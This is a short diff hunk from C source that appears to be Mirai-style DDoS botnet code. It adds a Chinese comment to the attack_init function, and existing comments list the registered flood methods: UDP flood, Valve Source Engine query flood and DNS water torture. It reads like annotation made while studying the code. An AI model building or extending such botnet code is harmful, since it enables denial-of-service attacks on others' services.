@@ -20,7 +20,7 @@ struct attack_method **methods = NULL;
 int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
 
 BOOL attack_init(void)  //注册一系列具体的Dos攻击函数【attack_app.c、attack_gre.c、attack_tcp.c和attack_udp.c中实现了具体的DoS攻击函数】
-{
+{   //在methods中增加不同攻击类型的DDos函数
     int i;
     /*1)Straight up UDP flood  2)Valve Source Engine query flood
     * 3)DNS water torture  4)Plain UDP flood optimized for speed
